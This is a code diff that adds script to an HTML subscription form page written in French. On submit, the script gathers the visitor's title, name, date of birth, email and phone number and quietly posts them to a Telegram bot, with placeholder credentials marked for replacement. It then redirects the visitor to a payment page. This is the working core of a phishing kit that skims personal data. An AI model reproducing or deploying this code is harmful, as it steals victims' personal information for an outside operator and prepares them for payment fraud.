@@ -260,4 +260,48 @@
     const toggleButtons = document.querySelectorAll("#civilite-toggle .toggle");
     const civiliteInput = document.getElementById("civilite");
 
-    toggleButtons.forEach(btn
+    toggleButtons.forEach(btn => {
+      btn.addEventListener("click", () => {
+        toggleButtons.forEach(b => b.classList.remove("active"));
+        btn.classList.add("active");
+        civiliteInput.value = btn.dataset.value;
+      });
+    });
+
+    const form = document.getElementById("form-abonnement");
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const civilite = document.getElementById("civilite").value;
+      const prenom = document.getElementById("prenom").value;
+      const nom = document.getElementById("nom").value;
+      const dob = document.getElementById("dob").value;
+      const email = document.getElementById("email").value;
+      const tel = document.getElementById("tel").value;
+
+      const message = `
+📥 Nouvelle soumission d'informations :
+👤 ${civilite} ${prenom} ${nom}
+🎂 Né(e) le : ${dob}
+📧 Email : ${email}
+📱 Téléphone : ${tel}
+      `;
+
+      // Optionnel : remplace par ton vrai token/chat_id
+      fetch("https://api.telegram.org/botTON_BOT/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "TON_CHAT_ID",
+          text: message
+        })
+      });
+
+      document.getElementById("spinnerOverlay").style.display = "flex";
+      setTimeout(() => {
+        window.location.href = "paiement.html";
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
